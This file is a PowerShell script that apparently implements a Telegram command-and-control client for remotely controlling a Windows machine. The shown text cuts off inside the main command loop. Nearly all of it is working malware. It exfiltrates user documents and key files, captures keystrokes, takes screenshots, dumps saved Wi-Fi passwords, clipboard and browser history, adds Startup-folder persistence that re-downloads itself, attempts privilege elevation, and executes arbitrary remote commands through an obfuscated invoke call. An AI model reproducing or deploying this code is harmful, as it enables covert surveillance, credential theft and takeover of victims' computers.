$Token = "$tg" 
# Define Connection Variables
$PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
$global:errormsg = 0 # 1 = return error messages to chat (off by default)
$parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
$URL='https://api.telegram.org/bot{0}' -f $Token
$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

# Emoji characters
$tick = [char]::ConvertFromUtf32(0x2705)
$comp = [char]::ConvertFromUtf32(0x1F4BB)
$closed = [char]::ConvertFromUtf32(0x274C)
$waiting = [char]::ConvertFromUtf32(0x1F55C)
$glass = [char]::ConvertFromUtf32(0x1F50D)
$cmde = [char]::ConvertFromUtf32(0x1F517)
$pause = [char]::ConvertFromUtf32(0x23F8)

# remove pause files
if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
# Startup Delay
Sleep 10
# Get Chat ID from the bot
$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
$MessageToSend = New-Object psobject 
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
# Collect script contents
$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
#----------------------------------------------- ON START ------------------------------------------------------
# Message waiting for passphrase
$contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
#----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------

Function Options{
$contents = "==============================================
========= $comp Telegram C2 Options List $comp ========
==============================================
============= $cmde Commands List $cmde ============
==============================================

Close   : Close this Session
ExtraInfo    : Extra commands information
PauseSession   : Kills this session and restarts
ToggleErrors    : Toggle error messages to chat
FolderTree    : Gets Dir tree and sends it zipped
Screenshot   : Sends a screenshot of the desktop
Keycapture    : Capture Keystrokes and send
Exfiltrate   : Sends files (see below for info)
Upload      : Uploads a specific file (use -path)
Systeminfo   : Send System info as text file
Softwareinfo   : Send Software info as text file
Historyinfo   : Send History info as text file
AddPersistance   : Add Telegram C2 to Startup
RemovePersistance   : Remove Startup Persistance
IsAdmin   : Checks if session has admin Privileges
AttemptElevate  : Send user a prompt to gain Admin
Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate' 

=============================================="
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
}

Function ExtraInfo{
$contents = "==============================================
============ $glass Examples and Info $glass ===========
==============================================

=========  Exfiltrate Command Examples ==========
( PS`> Exfiltrate -Path Documents -Filetype png )
( PS`> Exfiltrate -Filetype log )
( PS`> Exfiltrate )
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

PATH
Documents, Desktop, Downloads,
OneDrive, Pictures, Videos.
FILETYPE
log, db, txt, doc, pdf, jpg, jpeg, png,
wdoc, xdoc, cer, key, xls, xlsx,
cfg, conf, docx, rft.

==========  Upload Command Examples ===========
(PS`> Upload -Path C:/Path/To/File.txt)
Use 'FolderTree' command to show all files

=============================================="
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
}

Function Close{
$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
rm -Path "$env:temp/tgc2.txt" -Force
exit
}

Function Upload{
param ([string[]]$Path)
if (Test-Path -Path $path){
    $extension = [System.IO.Path]::GetExtension($path)
    if ($extension -eq ".exe" -or $extension -eq ".msi") {
        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
        Rm -Path $tempZipFilePath -Recurse -Force
    }else{
        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
        Rm -Path $tempZipFilePath -Recurse -Force
    }
}else{Write-Host "File Not Found: $path"}
}

Function Exfiltrate {
param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 50MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"
$contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
If($FileType -ne $null){$fileExtensions = "*."+$FileType}
else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")}
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
$escmsg = "Files from : "+$env:COMPUTERNAME
foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
                Remove-Item -Path $zipFilePath -Force
                Sleep 1
                $index++
                $zipFilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                $messages=rtgmsg
                    if ($messages.message.text -contains "kill") {
                    $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                    $params = @{chat_id = $ChatID ;text = $contents}
                    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
                    break
                    }
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
$zipArchive.Dispose()
curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"  | Out-Null
rm -Path $zipFilePath -Force
$contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
}


Function Screenshot{
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
$filePath = "$env:temp\sc.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $filePath
}

Function KeyCapture {
$contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
    $keyPressed = $false
    try{
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
            $keyPressed = $true
            $LastKeypressTime.Restart()
            $null = [console]::CapsLock
            $vtkey = $API::MapVirtualKey($asc, 3)
            $kbst = New-Object Byte[] 256
            $checkkbst = $API::GetKeyboardState($kbst)
            $logchar = New-Object -TypeName System.Text.StringBuilder          
                if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                $LString = $logchar.ToString()
                    if ($asc -eq 8) {$LString = "[BKSP]"}
                    if ($asc -eq 13) {$LString = "[ENT]"}
                    if ($asc -eq 27) {$LString = "[ESC]"}
                    $nosave += $LString 
                    }
                }
            }
        }
        $messages=rtgmsg
        if ($messages.message.text -contains "kill") {
        $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
        $params = @{chat_id = $ChatID ;text = $contents}
        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
        break
        }
    }
    finally{
        If ($keyPressed) {
            $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $contents = "$glass Keys Captured : "+$escmsgsys
            $params = @{chat_id = $ChatID ;text = $contents}
            Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
            $keyPressed = $false
            $nosave = ""
        }
    }
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}

Function SystemInfo{
$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement
$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
$Geolocate.Position.Location | Select Latitude,Longitude
$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
$outpath = "$env:temp\SystemInfo.txt"
"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
$FilePath = "$env:temp\SystemInfo.txt"
curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $FilePath -Force
}


Function SoftwareInfo{
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$outpath = "$env:temp\SoftwareInfo.txt"
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
$FilePath = "$env:temp\SoftwareInfo.txt"
curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $FilePath -Force
}


Function HistoryInfo{
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
$outpath = "$env:temp\History.txt"
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
(Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
$FilePath = "$env:temp\History.txt"
curl.exe -F chat_id="$ChatID" -F document=@"$FilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
Remove-Item -Path $FilePath -Force
}

Function ShowButtons{
$messagehead = "Press a Button to Continue..."
$inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
$paramers = @{
    chat_id = $chatId
    text = $messagehead
    reply_markup = $inlineKeyboardJson
}
Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
$killint = 0
$offset = 0
while ($killint -eq 0) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
    foreach ($update in $updates.result) {
        $offset = $update.update_id + 1
        Sleep 1
        if ($update.callback_query.data -eq "button_clicked") {
            $killint = 1
        }
        if ($update.callback_query.data -eq "button2_clicked") {
            $killint = 1
            Options
        }
    }
    Sleep 1
}
$contents = "$comp $env:COMPUTERNAME $tick Session Started"
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
}

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
$zipFilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $zipFilePath
sleep 1
curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
rm -Path $zipFilePath -Force
Write-Output "Done."
}

Function AddPersistance{
$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
sleep 1
if ($newScriptPath.Length -lt 100){
    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    sleep 1
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
$tobat | Out-File -FilePath $pth -Force
Write-Output "Persistance Added."
rm -path "$env:TEMP\temp.ps1" -Force
}

Function RemovePersistance{
rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
Write-Output "Uninstalled."
}

Function PauseSession{
$contents = "$env:COMPUTERNAME $pause Pausing Session.."
$params = @{chat_id = $ChatID ;text = $contents}
Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
$newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
if ($newScriptPath.Length -lt 100){
    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 2
Start-Process -FilePath $pth
rm -path "$env:TEMP\temp.ps1" -Force
exit
}

Function IsAdmin{
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $contents = "$closed Current Session is NOT Admin $closed"
    $params = @{chat_id = $ChatID ;text = $contents}
    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
    }
    else{
    $contents = "$tick Current Session IS Admin $tick"
    $params = @{chat_id = $ChatID ;text = $contents}
    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
    }
}

Function AttemptElevate{
Write-Output "Prompt Sent to User.."
if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
    $scriptContent | Out-File -FilePath $newScriptPath -force
    if ($newScriptPath.Length -lt 100){
        "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
        "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
        }
    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -File `"$env:APPDATA\Microsoft\Windows\temp.ps1`"") -Verb RunAs
    rm -path "$env:TEMP\temp.ps1" -Force
    }
}

Function ToggleErrors{
If($global:errormsg -eq 0){
    $global:errormsg = 1
    $contents = "$tick Error Messaging ON $tick"
    $params = @{chat_id = $ChatID ;text = $contents}
    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
    return
    }
If($global:errormsg -eq 1){
    $global:errormsg = 0
    $contents = "$closed Error Messaging OFF $closed"
    $params = @{chat_id = $ChatID ;text = $contents}
    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
    return
    }
}

# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------

Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
        $script:AcceptedSession="Authenticated"
        $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
        $params = @{chat_id = $ChatID ;text = $contents}
        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
        ShowButtons
        return $messages.message.chat.id
    }Else{return 0}
}

Function StrmFX{
param($Stream)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
$ReadAsArray= Get-Content -Path (Join-Path $env:temp -ChildPath "tgc2.txt") | where {$_.length -gt 0}
foreach ($line in $ReadAsArray){
    $ArrObj=New-Object psobject
    $ArrObj | Add-Member -MemberType NoteProperty -Name "Line" -Value ($line).tostring()
    $FixedResult +=$ArrObj
}
return $FixedResult
}

Function stgmsg{
param($Messagetext,$ChatID)
$FixedText=StrmFX -Stream $Messagetext
$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
$JsonData=($MessageToSend | ConvertTo-Json)
irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
$catcher = $FixedText
}

Function rtgmsg{
try{
    $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
    return $inMessage.result[-1]
    }
Catch{return "TGFail"}
}

#-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------

While ($true){
sleep 2
$messages=rtgmsg
    if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
    if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
    Else{
        if (($CheckAuthentication -ne 0) -and ($messages.message.text -notlike $PassPhrase) -and ($messages.message.date -ne $lastexecMessageID)){
            try{
                $Result=ie`x($messages.message.text) -ErrorAction Stop
                $Result
                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
                else{
                stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
                }
                }catch {
                    if($global:errormsg -eq 1){
